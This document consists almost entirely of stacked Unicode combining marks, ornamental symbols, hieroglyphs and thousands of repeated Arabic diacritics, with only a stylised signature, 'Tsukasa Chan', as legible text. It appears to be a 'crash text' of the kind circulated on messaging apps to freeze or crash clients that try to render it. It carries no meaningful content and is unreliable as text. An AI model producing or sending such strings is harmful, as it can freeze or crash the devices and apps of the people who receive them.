⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫